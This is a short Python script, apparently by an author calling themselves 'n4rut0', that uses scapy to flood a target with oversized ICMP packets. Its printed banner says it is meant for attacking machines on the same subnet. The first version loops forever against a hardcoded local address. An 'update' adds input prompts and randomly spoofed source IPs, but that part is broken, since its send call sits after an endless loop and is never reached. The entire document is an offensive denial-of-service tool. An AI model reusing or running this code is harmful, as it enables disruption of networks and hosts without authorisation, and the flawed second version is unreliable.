from scapy.all import *

print "-"*60
print "This program very useful for attack ip in same subnet with us"
print "But this very weakness if you attacking some website in other network"
print "-"*60


ip1 = IP(src="10.133.1.181",dst="10.133.1.153")
packet = ip1/ICMP()/("m"*60000)
while True:
  send(packet)
  
############# Latest Update #################

__author__ = 'n4rut0'

from scapy.all import *
import random
hostname = raw_input("Enter local hostname : ")
target = raw_input("Enter target hostname : ")

def attack():
    address = hostname.split(".")
    address[0]=str(random.randrange(11,97))
    address[1]=str(random.randrange(0,255))
    address[2]=str(random.randrange(0,255))
    address[3]=str(random.randrange(2,254))
    p = "."
    total = address[0] + p + address[1] + p + address[2] +p + address[3]
    print total
    return total


while True:
    ip=attack()

packet = IP(src=ip, dst=target)/ICMP()/("FAKEEVER"*60000)
send(packet)





